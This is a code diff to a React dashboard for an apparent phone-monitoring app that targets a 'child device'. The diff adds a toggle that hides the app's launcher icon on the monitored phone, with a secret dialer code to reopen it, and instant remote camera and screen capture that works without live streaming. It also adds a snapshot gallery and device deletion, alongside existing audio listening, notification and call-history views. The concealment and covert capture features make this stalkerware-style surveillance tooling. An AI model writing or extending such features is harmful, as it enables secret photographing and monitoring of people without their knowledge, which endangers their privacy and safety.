@@ -16,6 +16,8 @@ type Device = {
   screen_requested: boolean;
   has_screen?: boolean;
   screen_at?: string | null;
+  app_hidden: boolean;
+  secret_code: string | null;
   battery: number | null;
   charging: boolean | null;
   network: string | null;
@@ -197,7 +199,7 @@ function Dashboard({
   const [viewMode, setViewMode] = useState<"camera" | "screen">("camera");
   const [snapshotToast, setSnapshotToast] = useState<string | null>(null);
 
-  const saveSnapshot = (mode: "camera" | "screen") => {
+  const saveSnapshot = async (mode: "camera" | "screen") => {
     const src = mode === "camera" ? frameSrc : screenSrc;
     if (!src || !current) return;
     const a = document.createElement("a");
@@ -207,7 +209,17 @@ function Dashboard({
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
-    setSnapshotToast(`Snapshot captured and downloaded!`);
+
+    try {
+      await fetch(`/api/devices/${current.id}/snapshots`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ source: mode }),
+      });
+      setSnapshotToast(`Snapshot saved to Gallery & downloaded!`);
+    } catch {
+      setSnapshotToast(`Snapshot downloaded!`);
+    }
     setTimeout(() => setSnapshotToast(null), 2500);
   };
 
@@ -272,6 +284,34 @@ function Dashboard({
   const logout = async () => {
     await fetch("/api/session", { method: "DELETE" });
     onLogout();
+  };
+
+  const deleteDevice = async (id: string, name: string, e?: React.MouseEvent) => {
+    if (e) e.stopPropagation();
+    if (
+      !confirm(
+        `Are you sure you want to permanently delete "${name}"?\n\nThis will completely remove all photos, screen captures, activity logs, and call history for this device.`
+      )
+    ) {
+      return;
+    }
+    try {
+      const res = await fetch(`/api/devices/${id}`, { method: "DELETE" });
+      const data = await res.json();
+      if (data.ok) {
+        setDevices((prev) => {
+          const next = prev.filter((d) => d.id !== id);
+          if (selected === id) {
+            setSelected(next[0]?.id ?? null);
+          }
+          return next;
+        });
+      } else {
+        alert(data.error ?? "Failed to delete device.");
+      }
+    } catch {
+      alert("Failed to delete device.");
+    }
   };
 
   const current = devices.find((d) => d.id === selected) ?? null;
@@ -341,17 +381,17 @@ function Dashboard({
           {devices.map((d) => {
             const online = Date.now() - new Date(d.last_seen).getTime() < 20000;
             return (
-              <button
+              <div
                 key={d.id}
                 onClick={() => setSelected(d.id)}
-                className={`flex items-center justify-between rounded-lg border px-3 py-2 text-left text-sm transition-colors ${
+                className={`group flex items-center justify-between rounded-lg border px-3 py-2 text-left text-sm transition-colors cursor-pointer ${
                   selected === d.id
                     ? "border-blue-500 bg-blue-50 dark:bg-blue-950"
                     : "border-zinc-200 hover:bg-zinc-50 dark:border-zinc-800 dark:hover:bg-zinc-900"
                 }`}
               >
-                <span className="flex flex-col">
-                  <span className="font-medium">{d.name}</span>
+                <span className="flex flex-col min-w-0 pr-2">
+                  <span className="font-medium truncate">{d.name}</span>
                   <span className="flex items-center gap-2 text-xs text-zinc-500">
                     {secondsAgo(d.last_seen)}
                     {d.battery != null && (
@@ -365,13 +405,29 @@ function Dashboard({
                     )}
                   </span>
                 </span>
-                <span
-                  className={`h-2.5 w-2.5 rounded-full ${
-                    online ? "bg-green-500" : "bg-zinc-300 dark:bg-zinc-700"
-                  }`}
-                  aria-label={online ? "online" : "offline"}
-                />
-              </button>
+                <div className="flex items-center gap-2 shrink-0">
+                  <button
+                    type="button"
+                    title={`Delete ${d.name}`}
+                    onClick={(e) => deleteDevice(d.id, d.name, e)}
+                    className="rounded p-1 text-zinc-400 opacity-60 transition-all hover:bg-red-50 hover:text-red-600 hover:opacity-100 dark:hover:bg-red-950/50 dark:hover:text-red-400"
+                  >
+                    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                      <path d="M3 6h18"/>
+                      <path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"/>
+                      <path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/>
+                      <line x1="10" y1="11" x2="10" y2="17"/>
+                      <line x1="14" y1="11" x2="14" y2="17"/>
+                    </svg>
+                  </button>
+                  <span
+                    className={`h-2.5 w-2.5 rounded-full ${
+                      online ? "bg-green-500" : "bg-zinc-300 dark:bg-zinc-700"
+                    }`}
+                    aria-label={online ? "online" : "offline"}
+                  />
+                </div>
+              </div>
             );
           })}
         </aside>
@@ -516,16 +572,31 @@ function Dashboard({
                   ? `last camera frame ${current.frame_at ? secondsAgo(current.frame_at) : "—"}`
                   : `last screen frame ${current.screen_at ? secondsAgo(current.screen_at) : "—"}`}
               </p>
-              {((viewMode === "camera" && frameSrc) || (viewMode === "screen" && screenSrc)) && (
+              <div className="flex items-center gap-3">
+                {((viewMode === "camera" && frameSrc) || (viewMode === "screen" && screenSrc)) && (
+                  <button
+                    type="button"
+                    onClick={() => saveSnapshot(viewMode)}
+                    className="flex items-center gap-1 font-semibold text-blue-600 hover:text-blue-500 dark:text-blue-400"
+                  >
+                    <span>📸</span>
+                    <span>Save snapshot</span>
+                  </button>
+                )}
                 <button
                   type="button"
-                  onClick={() => saveSnapshot(viewMode)}
-                  className="flex items-center gap-1 font-semibold text-blue-600 hover:text-blue-500 dark:text-blue-400"
+                  onClick={() => deleteDevice(current.id, current.name)}
+                  className="flex items-center gap-1 font-semibold text-red-600 hover:text-red-500 dark:text-red-400 transition-colors"
+                  title={`Permanently delete ${current.name}`}
                 >
-                  <span>📸</span>
-                  <span>Save snapshot</span>
+                  <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                    <path d="M3 6h18"/>
+                    <path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"/>
+                    <path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/>
+                  </svg>
+                  <span>Delete device</span>
                 </button>
-              )}
+              </div>
             </div>
           )}
 
@@ -606,6 +677,8 @@ function DeviceControls({
     audioEnabled?: boolean;
     streamRequested?: boolean;
     screenRequested?: boolean;
+    appHidden?: boolean;
+    secretCode?: string;
   }) => {
     setBusy(true);
     try {
@@ -697,13 +770,82 @@ function DeviceControls({
         or screen mirror is active.
       </p>
 
+      <HideAppControl device={device} busy={busy} update={update} />
+
       <DeviceActivityTabs deviceId={device.id} />
     </div>
   );
 }
 
+/**
+ * Hide-app control: toggles the launcher icon on the child device and shows the
+ * dialer code that reopens the app (dial *#*#<code>#*#* in the phone dialer).
+ */
+function HideAppControl({
+  device,
+  busy,
+  update,
+}: {
+  device: Device;
+  busy: boolean;
+  update: (payload: { appHidden?: boolean }) => Promise<void>;
+}) {
+  const code = device.secret_code ?? "";
+  const dialString = code ? `*#*#${code}#*#*` : "—";
+  const [copied, setCopied] = useState(false);
+
+  const copyCode = async () => {
+    if (!code) return;
+    try {
+      await navigator.clipboard.writeText(dialString);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 1500);
+    } catch {
+      /* clipboard unavailable */
+    }
+  };
+
+  return (
+    <div className="flex flex-col gap-2 rounded-xl border border-amber-200 bg-amber-50 p-3 dark:border-amber-900/50 dark:bg-amber-950/30">
+      <div className="flex items-center justify-between">
+        <span className="text-sm font-medium">Hide app icon</span>
+        <button
+          disabled={busy}
+          onClick={() => update({ appHidden: !device.app_hidden })}
+          className={`rounded-md px-3 py-1 text-sm transition-colors ${
+            device.app_hidden
+              ? "bg-amber-600 text-white"
+              : "bg-zinc-100 text-zinc-600 dark:bg-zinc-800 dark:text-zinc-300"
+          } disabled:opacity-60`}
+        >
+          {device.app_hidden ? "Hidden" : "Visible"}
+        </button>
+      </div>
+      <div className="flex items-center justify-between gap-2">
+        <span className="text-xs text-zinc-500">
+          Reopen by dialing this code in the phone dialer:
+        </span>
+        <button
+          onClick={copyCode}
+          disabled={!code}
+          title="Copy"
+          className="rounded-md bg-white px-2.5 py-1 font-mono text-sm font-semibold tracking-wider text-amber-700 ring-1 ring-amber-300 hover:bg-amber-100 disabled:opacity-60 dark:bg-zinc-900 dark:text-amber-300 dark:ring-amber-800"
+        >
+          {copied ? "Copied!" : dialString}
+        </button>
+      </div>
+      {device.app_hidden && (
+        <p className="text-xs text-amber-700 dark:text-amber-400">
+          The icon is hidden on the child device. Open the phone dialer and type
+          the code above to bring the app back.
+        </p>
+      )}
+    </div>
+  );
+}
+
 function DeviceActivityTabs({ deviceId }: { deviceId: string }) {
-  const [activeTab, setActiveTab] = useState<"notifications" | "calls">(
+  const [activeTab, setActiveTab] = useState<"notifications" | "calls" | "snapshots">(
     "notifications",
   );
 
@@ -730,12 +872,24 @@ function DeviceActivityTabs({ deviceId }: { deviceId: string }) {
         >
           Call History
         </button>
+        <button
+          onClick={() => setActiveTab("snapshots")}
+          className={`flex-1 rounded-md py-1 text-xs font-medium transition-colors ${
+            activeTab === "snapshots"
+              ? "bg-white text-zinc-900 shadow-xs dark:bg-zinc-700 dark:text-white"
+              : "text-zinc-500 hover:text-zinc-900 dark:text-zinc-400 dark:hover:text-white"
+          }`}
+        >
+          📸 Snapshots
+        </button>
       </div>
 
       {activeTab === "notifications" ? (
         <AppActivity deviceId={deviceId} />
-      ) : (
+      ) : activeTab === "calls" ? (
         <CallHistory deviceId={deviceId} />
+      ) : (
+        <SnapshotsGallery deviceId={deviceId} />
       )}
     </div>
   );
@@ -1255,4 +1409,329 @@ function AudioListener({ deviceId }: { deviceId: string }) {
     </div>
   );
 }
+
+type SnapshotItem = {
+  id: string;
+  device_id: string;
+  source: "camera" | "screen";
+  mime: string;
+  created_at: string;
+  size: number;
+};
+
+function SnapshotsGallery({ deviceId }: { deviceId: string }) {
+  const [items, setItems] = useState<SnapshotItem[]>([]);
+  const [filter, setFilter] = useState<"all" | "camera" | "screen">("all");
+  const [loading, setLoading] = useState(true);
+  const [requesting, setRequesting] = useState<"camera" | "screen" | null>(null);
+  const [statusMsg, setStatusMsg] = useState<string | null>(null);
+  const [lightbox, setLightbox] = useState<SnapshotItem | null>(null);
+
+  const load = async () => {
+    try {
+      const res = await fetch(`/api/devices/${deviceId}/snapshots`, { cache: "no-store" });
+      const data = await res.json();
+      if (data.ok) {
+        setItems(data.snapshots as SnapshotItem[]);
+      }
+    } catch {
+      /* ignore */
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  useEffect(() => {
+    setLoading(true);
+    load();
+    const id = setInterval(load, 4000);
+    return () => clearInterval(id);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [deviceId]);
+
+  const requestSnapshot = async (source: "camera" | "screen") => {
+    setRequesting(source);
+    setStatusMsg(`Requesting instant ${source} snapshot from device...`);
+    try {
+      const res = await fetch(`/api/devices/${deviceId}/snapshot-request`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ source }),
+      });
+      const data = await res.json();
+      if (data.ok) {
+        setStatusMsg(`Request sent! Waiting for device to capture and upload...`);
+        let attempts = 0;
+        const pollId = setInterval(async () => {
+          attempts++;
+          await load();
+          if (attempts >= 10) {
+            clearInterval(pollId);
+            setRequesting(null);
+            setStatusMsg(null);
+          }
+        }, 1500);
+      } else {
+        setStatusMsg(data.error ?? "Request failed");
+        setTimeout(() => {
+          setRequesting(null);
+          setStatusMsg(null);
+        }, 3000);
+      }
+    } catch {
+      setStatusMsg("Failed to send request.");
+      setTimeout(() => {
+        setRequesting(null);
+        setStatusMsg(null);
+      }, 3000);
+    }
+  };
+
+  const deleteSnapshot = async (id: string, e?: React.MouseEvent) => {
+    if (e) e.stopPropagation();
+    if (!confirm("Are you sure you want to delete this snapshot?")) return;
+    try {
+      await fetch(`/api/devices/${deviceId}/snapshots/${id}`, { method: "DELETE" });
+      setItems((prev) => prev.filter((item) => item.id !== id));
+      if (lightbox?.id === id) setLightbox(null);
+    } catch {
+      alert("Failed to delete snapshot.");
+    }
+  };
+
+  const downloadSnapshot = (id: string, source: string, created_at: string, e?: React.MouseEvent) => {
+    if (e) e.stopPropagation();
+    const a = document.createElement("a");
+    a.href = `/api/devices/${deviceId}/snapshots/${id}`;
+    const stamp = new Date(created_at).toISOString().replace(/[:.]/g, "-");
+    a.download = `snapshot_${source}_${stamp}.jpg`;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  };
+
+  const filtered = items.filter((item) => {
+    if (filter === "camera") return item.source === "camera";
+    if (filter === "screen") return item.source === "screen";
+    return true;
+  });
+
+  return (
+    <div className="mt-3 flex flex-col gap-3">
+      {/* On-Demand Remote Snapshot Actions */}
+      <div className="flex flex-col gap-2 rounded-xl bg-zinc-50 p-3 dark:bg-zinc-800/60 border border-zinc-200/80 dark:border-zinc-700/60">
+        <div className="flex items-center justify-between">
+          <span className="text-xs font-semibold text-zinc-700 dark:text-zinc-300">
+            Instant Remote Capture
+          </span>
+          <span className="text-[11px] text-zinc-400">
+            Works even if live streaming is off
+          </span>
+        </div>
+        <div className="grid grid-cols-2 gap-2">
+          <button
+            type="button"
+            disabled={requesting !== null}
+            onClick={() => requestSnapshot("camera")}
+            className="flex items-center justify-center gap-1.5 rounded-lg bg-blue-600 px-3 py-2 text-xs font-semibold text-white shadow-xs transition-all hover:bg-blue-500 active:scale-95 disabled:opacity-50"
+          >
+            <span>📷</span>
+            <span>{requesting === "camera" ? "Capturing…" : "Capture Photo"}</span>
+          </button>
+          <button
+            type="button"
+            disabled={requesting !== null}
+            onClick={() => requestSnapshot("screen")}
+            className="flex items-center justify-center gap-1.5 rounded-lg bg-indigo-600 px-3 py-2 text-xs font-semibold text-white shadow-xs transition-all hover:bg-indigo-500 active:scale-95 disabled:opacity-50"
+          >
+            <span>📱</span>
+            <span>{requesting === "screen" ? "Capturing…" : "Capture Screen"}</span>
+          </button>
+        </div>
+        {statusMsg && (
+          <div className="flex items-center gap-2 rounded-lg bg-blue-50 px-2.5 py-1.5 text-[11px] text-blue-700 dark:bg-blue-950/40 dark:text-blue-300">
+            <span className="h-2 w-2 animate-ping rounded-full bg-blue-500" />
+            <span>{statusMsg}</span>
+          </div>
+        )}
+      </div>
+
+      {/* Filter Tabs & Count */}
+      <div className="flex items-center justify-between gap-2">
+        <div className="flex gap-1">
+          {(
+            [
+              { key: "all", label: `All (${items.length})` },
+              {
+                key: "camera",
+                label: `📷 Camera (${items.filter((i) => i.source === "camera").length})`,
+              },
+              {
+                key: "screen",
+                label: `📱 Screen (${items.filter((i) => i.source === "screen").length})`,
+              },
+            ] as const
+          ).map((t) => (
+            <button
+              key={t.key}
+              onClick={() => setFilter(t.key)}
+              className={`rounded-md px-2.5 py-1 text-xs font-medium transition-colors ${
+                filter === t.key
+                  ? "bg-zinc-900 text-white dark:bg-zinc-100 dark:text-zinc-900"
+                  : "bg-zinc-100 text-zinc-600 hover:bg-zinc-200 dark:bg-zinc-800 dark:text-zinc-400 dark:hover:bg-zinc-700"
+              }`}
+            >
+              {t.label}
+            </button>
+          ))}
+        </div>
+        <button
+          onClick={load}
+          title="Refresh gallery"
+          className="text-xs text-zinc-400 hover:text-zinc-600 dark:hover:text-zinc-200"
+        >
+          ↻ Refresh
+        </button>
+      </div>
+
+      {/* Gallery Grid */}
+      {loading && items.length === 0 ? (
+        <div className="flex h-36 items-center justify-center text-xs text-zinc-400">
+          Loading snapshots…
+        </div>
+      ) : filtered.length === 0 ? (
+        <div className="flex flex-col items-center justify-center rounded-xl border border-dashed border-zinc-200 py-10 text-center dark:border-zinc-800">
+          <span className="text-2xl mb-1">🖼️</span>
+          <p className="text-xs font-medium text-zinc-600 dark:text-zinc-400">
+            No snapshots found
+          </p>
+          <p className="mt-0.5 text-[11px] text-zinc-400">
+            Use the buttons above or &quot;Take snapshot&quot; while streaming to capture photos.
+          </p>
+        </div>
+      ) : (
+        <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5 max-h-[460px] overflow-y-auto pr-1">
+          {filtered.map((item) => (
+            <div
+              key={item.id}
+              onClick={() => setLightbox(item)}
+              className="group relative cursor-pointer overflow-hidden rounded-xl border border-zinc-200 bg-zinc-100 shadow-2xs transition-all hover:-translate-y-0.5 hover:shadow-md dark:border-zinc-800 dark:bg-zinc-900"
+            >
+              <div className="relative aspect-4/3 w-full overflow-hidden bg-black/10">
+                {/* eslint-disable-next-line @next/next/no-img-element */}
+                <img
+                  src={`/api/devices/${deviceId}/snapshots/${item.id}`}
+                  alt={`${item.source} snapshot`}
+                  className="h-full w-full object-cover transition-transform duration-300 group-hover:scale-105"
+                  loading="lazy"
+                />
+                <span
+                  className={`absolute left-1.5 top-1.5 rounded-md px-1.5 py-0.5 text-[10px] font-semibold text-white backdrop-blur-xs shadow-xs ${
+                    item.source === "screen" ? "bg-indigo-600/90" : "bg-blue-600/90"
+                  }`}
+                >
+                  {item.source === "screen" ? "📱 Screen" : "📷 Camera"}
+                </span>
+
+                {/* Hover overlay with actions */}
+                <div className="absolute inset-0 flex items-center justify-center gap-1.5 bg-black/40 opacity-0 backdrop-blur-2xs transition-opacity group-hover:opacity-100">
+                  <button
+                    type="button"
+                    onClick={(e) => downloadSnapshot(item.id, item.source, item.created_at, e)}
+                    className="rounded-lg bg-white/90 p-1.5 text-xs text-zinc-900 shadow-md hover:bg-white active:scale-95"
+                    title="Download image"
+                  >
+                    📥
+                  </button>
+                  <button
+                    type="button"
+                    onClick={(e) => deleteSnapshot(item.id, e)}
+                    className="rounded-lg bg-red-600/90 p-1.5 text-xs text-white shadow-md hover:bg-red-600 active:scale-95"
+                    title="Delete snapshot"
+                  >
+                    🗑️
+                  </button>
+                </div>
+              </div>
+
+              <div className="flex items-center justify-between p-2 text-[10px] text-zinc-500 dark:text-zinc-400">
+                <span title={new Date(item.created_at).toLocaleString()}>
+                  {secondsAgo(item.created_at)}
+                </span>
+                <span>{item.size ? `${Math.round(item.size / 1024)} KB` : ""}</span>
+              </div>
+            </div>
+          ))}
+        </div>
+      )}
+
+      {/* Lightbox / Fullscreen Preview Modal */}
+      {lightbox && (
+        <div
+          role="dialog"
+          aria-modal="true"
+          onClick={() => setLightbox(null)}
+          className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-4 backdrop-blur-sm animate-fade-in"
+        >
+          <div
+            onClick={(e) => e.stopPropagation()}
+            className="relative flex max-h-[92vh] max-w-[92vw] flex-col overflow-hidden rounded-2xl border border-zinc-700 bg-zinc-950 shadow-2xl"
+          >
+            {/* Modal Header */}
+            <div className="flex items-center justify-between border-b border-zinc-800 px-4 py-3 text-white">
+              <div className="flex items-center gap-2">
+                <span
+                  className={`rounded-md px-2 py-0.5 text-xs font-semibold ${
+                    lightbox.source === "screen" ? "bg-indigo-600" : "bg-blue-600"
+                  }`}
+                >
+                  {lightbox.source === "screen" ? "Screen Snapshot" : "Camera Photo"}
+                </span>
+                <span className="text-xs text-zinc-400">
+                  {new Date(lightbox.created_at).toLocaleString()}
+                </span>
+              </div>
+              <div className="flex items-center gap-2">
+                <button
+                  type="button"
+                  onClick={() =>
+                    downloadSnapshot(lightbox.id, lightbox.source, lightbox.created_at)
+                  }
+                  className="rounded-lg bg-zinc-800 px-3 py-1 text-xs font-medium text-white hover:bg-zinc-700"
+                >
+                  📥 Download
+                </button>
+                <button
+                  type="button"
+                  onClick={() => deleteSnapshot(lightbox.id)}
+                  className="rounded-lg bg-red-600/80 px-3 py-1 text-xs font-medium text-white hover:bg-red-600"
+                >
+                  🗑️ Delete
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setLightbox(null)}
+                  className="rounded-lg bg-zinc-800 px-2.5 py-1 text-sm font-semibold text-zinc-300 hover:bg-zinc-700 hover:text-white"
+                >
+                  ✕
+                </button>
+              </div>
+            </div>
+
+            {/* Modal Image Display */}
+            <div className="flex max-h-[80vh] items-center justify-center p-3">
+              {/* eslint-disable-next-line @next/next/no-img-element */}
+              <img
+                src={`/api/devices/${deviceId}/snapshots/${lightbox.id}`}
+                alt="Fullscreen snapshot"
+                className="max-h-[75vh] max-w-[85vw] rounded-lg object-contain shadow-lg"
+              />
+            </div>
+          </div>
+        </div>
+      )}
+    </div>
+  );
+}
+
 
